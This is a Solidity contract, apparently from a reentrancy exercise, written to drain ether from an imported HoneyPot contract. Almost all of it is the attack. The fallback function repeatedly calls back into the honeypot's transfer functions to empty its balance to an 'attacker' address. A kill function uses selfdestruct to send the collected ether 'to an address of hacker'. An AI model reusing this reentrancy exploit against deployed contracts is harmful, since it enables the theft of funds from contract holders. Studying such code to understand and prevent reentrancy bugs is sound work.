pragma solidity ^0.5.0;
import "./SafeMath.sol";
import "./HoneyPot.sol";
// import "openzeppelin-solidity/contracts/ownership/Ownable.sol";

contract honeypotCollect {
  using SafeMath for uint256;
  HoneyPot public honeypot;
  uint private _iteration;
  uint private _maxIterations;
  address payable _owner;
  address payable attacker;
  uint256 private _ownBalance;
  constructor (address payable _honeypot) public {
    // pass an address will be the honeypot
    honeypot = HoneyPot(_honeypot);
    _owner = msg.sender;
  }

  function getOwner() public view returns (address __owner) {
    __owner = _owner;
  }

  /**
    * @dev Throws if called by any account other than the owner.
    */
  modifier onlyOwner() {
      require(msg.sender == _owner, "Ownable: caller is not the owner");
      _;
  }

  // to get the collected ether to an address of hacker
  // mechanism to destroy the honeypotCollect and send all ether containing in it to the address
  function kill (address payable killAddress) public onlyOwner {
    selfdestruct(killAddress);
  }


  // set the reentrancy attack in motion. It puts some ether in honeypot
  function collect(uint256 maxIterations) payable public onlyOwner {
    // _ownBalance = msg.value;
    _iteration = 0;
    _maxIterations = maxIterations;
    attacker = msg.sender;
    honeypot.put.value(msg.value)();
    
    require(honeypot._transfer() == true, "_transfer function got failed");
    // require(honeypot.get() == true, "get function got failed");
  }

  function withdraw(address payable withdrawAddress, uint256 withdrawAmount)
  public onlyOwner
  {
      require(address(this).balance > withdrawAmount, "not enough funds");

      withdrawAddress.transfer(withdrawAmount);
  }
  // the fallback function is called whenever the honeypotCollect contract receives ether
  function () payable external {
    // revert("it received ethers");
    if (address(honeypot).balance > 0 && _iteration < _maxIterations) {
        _iteration += 1;
        // require(honeypot._transfer() == true, "get function got failed");
        // require(honeypot.get() == true, "get function at fallback got failed");
       
        honeypot._transferTo(attacker);
         honeypot._transfer();
    }
    // honeypot._transfer(msg.sender, _ownBalance.div(4));
    
  }
}
